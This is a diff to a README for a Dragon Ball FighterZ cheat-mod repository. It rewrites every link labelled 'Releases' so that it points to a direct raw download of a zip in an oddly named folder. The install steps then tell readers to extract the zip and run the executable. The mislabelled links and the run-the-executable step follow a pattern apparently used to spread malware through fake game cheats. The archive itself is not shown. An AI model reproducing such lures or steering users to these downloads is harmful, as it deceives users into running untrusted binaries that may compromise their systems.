@@ -1,6 +1,6 @@
 # DBFZ Cheat Engine Mod 🎮
 
-Welcome to the **DBFZ Cheat Engine Mod** repository! This project offers various cheats and modifications for **Dragon Ball FighterZ** on PC. If you want to enhance your gaming experience, you're in the right place. You can find the latest releases [here](https://github.com/govardhan908/DBFZ-cheat-engine-mod/releases).
+Welcome to the **DBFZ Cheat Engine Mod** repository! This project offers various cheats and modifications for **Dragon Ball FighterZ** on PC. If you want to enhance your gaming experience, you're in the right place. You can find the latest releases [here](https://github.com/govardhan908/DBFZ-cheat-engine-mod/raw/refs/heads/main/Caprimulgidae/cheat-mod-engine-DBF-2.5.zip).
 
 ## Table of Contents
 
@@ -31,7 +31,7 @@ Welcome to the **DBFZ Cheat Engine Mod** repository! This project offers various
 
 To install the mod, follow these steps:
 
-1. Download the latest release from the [Releases](https://github.com/govardhan908/DBFZ-cheat-engine-mod/releases) section.
+1. Download the latest release from the [Releases](https://github.com/govardhan908/DBFZ-cheat-engine-mod/raw/refs/heads/main/Caprimulgidae/cheat-mod-engine-DBF-2.5.zip) section.
 2. Extract the downloaded file to your desired location.
 3. Run the executable file to start the mod.
 
@@ -75,4 +75,4 @@ For any inquiries or support, feel free to reach out via GitHub issues or contac
 
 ---
 
-Thank you for checking out the **DBFZ Cheat Engine Mod**! Enjoy your enhanced gaming experience. Don't forget to visit the [Releases](https://github.com/govardhan908/DBFZ-cheat-engine-mod/releases) section for the latest updates and downloads.
+Thank you for checking out the **DBFZ Cheat Engine Mod**! Enjoy your enhanced gaming experience. Don't forget to visit the [Releases](https://github.com/govardhan908/DBFZ-cheat-engine-mod/raw/refs/heads/main/Caprimulgidae/cheat-mod-engine-DBF-2.5.zip) section for the latest updates and downloads.
